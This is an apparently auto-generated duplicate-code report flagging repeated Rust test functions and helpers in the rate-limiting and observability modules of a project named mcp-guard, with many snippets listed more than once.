#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 572

**Code:**
```
    fn test_ttl_cleanup() {
        let config = test_config(true, 10, 10);
        // Set TTL to 0 so entries are immediately expired
        let service = RateLimitService::new(&config).with_ttl(Duration::ZERO);

        // Create entries for multiple users
        service.check("user_a", None);
        service.check("user_b", None);
        service.check("user_c", None);

        assert_eq!(service.tracked_identities(), 3);

        // Cleanup should remove all expired entries
        service.cleanup_expired();

        assert_eq!(service.tracked_identities(), 0);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 592

**Code:**
```
    fn test_ttl_preserves_active_entries() {
        let config = test_config(true, 10, 10);
        // Set a longer TTL
        let service = RateLimitService::new(&config).with_ttl(Duration::from_secs(3600));

        // Create entries for multiple users
        service.check("user_a", None);
        service.check("user_b", None);

        assert_eq!(service.tracked_identities(), 2);

        // Cleanup should preserve entries that haven't expired
        service.cleanup_expired();

        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 615

**Code:**
```
    fn test_tool_rate_limit_no_config() {
        let config = test_config(true, 100, 50);
        let service = RateLimitService::new(&config);

        // Should return None when no tool limits are configured
        assert!(service.check_tool("user", "execute_code").is_none());
        assert!(!service.has_tool_limits());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 615

**Code:**
```
    fn test_tool_rate_limit_no_config() {
        let config = test_config(true, 100, 50);
        let service = RateLimitService::new(&config);

        // Should return None when no tool limits are configured
        assert!(service.check_tool("user", "execute_code").is_none());
        assert!(!service.has_tool_limits());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 615

**Code:**
```
    fn test_tool_rate_limit_no_config() {
        let config = test_config(true, 100, 50);
        let service = RateLimitService::new(&config);

        // Should return None when no tool limits are configured
        assert!(service.check_tool("user", "execute_code").is_none());
        assert!(!service.has_tool_limits());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 615

**Code:**
```
    fn test_tool_rate_limit_no_config() {
        let config = test_config(true, 100, 50);
        let service = RateLimitService::new(&config);

        // Should return None when no tool limits are configured
        assert!(service.check_tool("user", "execute_code").is_none());
        assert!(!service.has_tool_limits());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.4% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 166

**Code:**
```
    fn get_identity_limiter(&self, identity_id: &str, custom_limit: Option<u32>) -> Arc<Limiter> {
        let now = Instant::now();

        // Check if we already have a limiter for this identity
        if let Some(mut entry) = self.identity_limiters.get_mut(identity_id) {
            entry.last_access = now;
            return entry.limiter.clone();
        }

        // Note: Cleanup is now handled by a background task to avoid latency spikes
        // See start_cleanup_task() for the background cleanup implementation

        // Create a new limiter for this identity
        let (rps, burst) = if let Some(custom_rps) = custom_limit {
            // Use custom rate limit with proportional burst
            let custom_burst = (custom_rps as f32 * 0.5).max(1.0) as u32;
            (custom_rps, custom_burst)
        } else {
            // Use defaults
            (self.default_rps, self.default_burst)
        };

        let limiter = Arc::new(Self::create_limiter(rps, burst));
        let entry = RateLimitEntry {
            limiter: limiter.clone(),
            last_access: now,
        };
        self.identity_limiters.insert(identity_id.to_string(), entry);
        limiter
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 95.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 456

**Code:**
```
    fn test_tracing_config_propagate_context() {
        let config = TracingConfig {
            propagate_context: false,
            ..Default::default()
        };
        assert!(!config.propagate_context);
        
        let config = TracingConfig {
            propagate_context: true,
            ..Default::default()
        };
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 386

**Code:**
```
    fn test_init_tracing_otel_disabled() {
        let config = TracingConfig {
            enabled: false,
            // ... other fields default
            ..Default::default()
        };
        // Should ignore config if enabled is false
        let guard = init_tracing(true, Some(&config));
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 402

**Code:**
```
    fn test_tracing_config_sample_rate_boundaries() {
        // Test sample rate 0.0 (always off)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.0);
        
        // Test sample rate 1.0 (always on)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 1.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 1.0);
        
        // Test middle value
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.5,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 444

**Code:**
```
    fn test_init_metrics_multiple_calls() {
        // Init metrics multiple times should not panic
        // (subsequent calls return local recorder handles)
        let handle1 = create_metrics_handle();
        let handle2 = create_metrics_handle();
        
        // Both should render valid output
        let _ = handle1.render();
        let _ = handle2.render();
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 429

**Code:**
```
    fn test_tracing_config_with_otlp_endpoint() {
        let config = TracingConfig {
            enabled: true,
            otlp_endpoint: Some("http://localhost:4317".to_string()),
            service_name: "test-service".to_string(),
            sample_rate: 0.1,
            propagate_context: true,
        };
        
        assert!(config.enabled);
        assert_eq!(config.otlp_endpoint, Some("http://localhost:4317".to_string()));
        assert_eq!(config.service_name, "test-service");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 456

**Code:**
```
    fn test_tracing_config_propagate_context() {
        let config = TracingConfig {
            propagate_context: false,
            ..Default::default()
        };
        assert!(!config.propagate_context);
        
        let config = TracingConfig {
            propagate_context: true,
            ..Default::default()
        };
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 344

**Code:**
```
    fn test_record_request_various_methods() {
        record_request("GET", 200, std::time::Duration::from_millis(10));
        record_request("POST", 201, std::time::Duration::from_millis(20));
        record_request("DELETE", 204, std::time::Duration::from_millis(5));
        record_request("PUT", 400, std::time::Duration::from_millis(15));
        record_request("PATCH", 500, std::time::Duration::from_millis(100));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 429

**Code:**
```
    fn test_tracing_config_with_otlp_endpoint() {
        let config = TracingConfig {
            enabled: true,
            otlp_endpoint: Some("http://localhost:4317".to_string()),
            service_name: "test-service".to_string(),
            sample_rate: 0.1,
            propagate_context: true,
        };
        
        assert!(config.enabled);
        assert_eq!(config.otlp_endpoint, Some("http://localhost:4317".to_string()));
        assert_eq!(config.service_name, "test-service");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 314

**Code:**
```
    fn test_record_functions_dont_panic() {
        // These functions should not panic even without a recorder installed
        // (metrics crate provides a no-op recorder by default)
        record_request("POST", 200, std::time::Duration::from_millis(50));
        record_auth("api_key", true);
        record_auth("jwt", false);
        record_rate_limit(true);
        record_rate_limit(false);
        set_active_identities(5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 386

**Code:**
```
    fn test_init_tracing_otel_disabled() {
        let config = TracingConfig {
            enabled: false,
            // ... other fields default
            ..Default::default()
        };
        // Should ignore config if enabled is false
        let guard = init_tracing(true, Some(&config));
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_init_tracing_enabled_no_otlp() {
        let config = TracingConfig {
            enabled: true,
            otlp_endpoint: None,
            service_name: "test".into(),
            sample_rate: 1.0,
            propagate_context: true,
        };
        // Should initialize partial tracing pipeline without OTLP
        let guard = init_tracing(false, Some(&config));
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.5% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 429

**Code:**
```
    fn test_tracing_config_with_otlp_endpoint() {
        let config = TracingConfig {
            enabled: true,
            otlp_endpoint: Some("http://localhost:4317".to_string()),
            service_name: "test-service".to_string(),
            sample_rate: 0.1,
            propagate_context: true,
        };
        
        assert!(config.enabled);
        assert_eq!(config.otlp_endpoint, Some("http://localhost:4317".to_string()));
        assert_eq!(config.service_name, "test-service");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 429

**Code:**
```
    fn test_tracing_config_with_otlp_endpoint() {
        let config = TracingConfig {
            enabled: true,
            otlp_endpoint: Some("http://localhost:4317".to_string()),
            service_name: "test-service".to_string(),
            sample_rate: 0.1,
            propagate_context: true,
        };
        
        assert!(config.enabled);
        assert_eq!(config.otlp_endpoint, Some("http://localhost:4317".to_string()));
        assert_eq!(config.service_name, "test-service");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.2% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 444

**Code:**
```
    fn test_init_metrics_multiple_calls() {
        // Init metrics multiple times should not panic
        // (subsequent calls return local recorder handles)
        let handle1 = create_metrics_handle();
        let handle2 = create_metrics_handle();
        
        // Both should render valid output
        let _ = handle1.render();
        let _ = handle2.render();
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 386

**Code:**
```
    fn test_init_tracing_otel_disabled() {
        let config = TracingConfig {
            enabled: false,
            // ... other fields default
            ..Default::default()
        };
        // Should ignore config if enabled is false
        let guard = init_tracing(true, Some(&config));
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 326

**Code:**
```
    fn test_current_trace_id_without_otel() {
        // Without OpenTelemetry initialized, should return None
        let trace_id = current_trace_id();
        // May or may not be None depending on global state, but shouldn't panic
        let _ = trace_id;
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 353

**Code:**
```
    fn test_record_auth_various_providers() {
        record_auth("api_key", true);
        record_auth("jwt", true);
        record_auth("oauth", true);
        record_auth("mtls", true);
        record_auth("api_key", false);
        record_auth("jwt", false);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.7% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 386

**Code:**
```
    fn test_init_tracing_otel_disabled() {
        let config = TracingConfig {
            enabled: false,
            // ... other fields default
            ..Default::default()
        };
        // Should ignore config if enabled is false
        let guard = init_tracing(true, Some(&config));
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.1% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.9% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 371

**Code:**
```
    fn test_tracing_guard_drop() {
        // TracingGuard with None provider should drop without issue
        let guard = TracingGuard { _provider: None };
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.5% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 303

**Code:**
```
    fn test_tracing_config_defaults() {
        let config = TracingConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.service_name, "mcp-guard");
        assert!(config.otlp_endpoint.is_none());
        // SECURITY: sample_rate defaults to 0.1 (10%) for production safety
        assert_eq!(config.sample_rate, 0.1);
        assert!(config.propagate_context);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.4% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 44

**Code:**
```
    fn drop(&mut self) {
        if let Some(ref provider) = self._provider {
            if let Err(e) = provider.shutdown() {
                eprintln!("Error shutting down OpenTelemetry tracer: {:?}", e);
            }
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.8% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 353

**Code:**
```
    fn test_record_auth_various_providers() {
        record_auth("api_key", true);
        record_auth("jwt", true);
        record_auth("oauth", true);
        record_auth("mtls", true);
        record_auth("api_key", false);
        record_auth("jwt", false);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.6% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.5% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 444

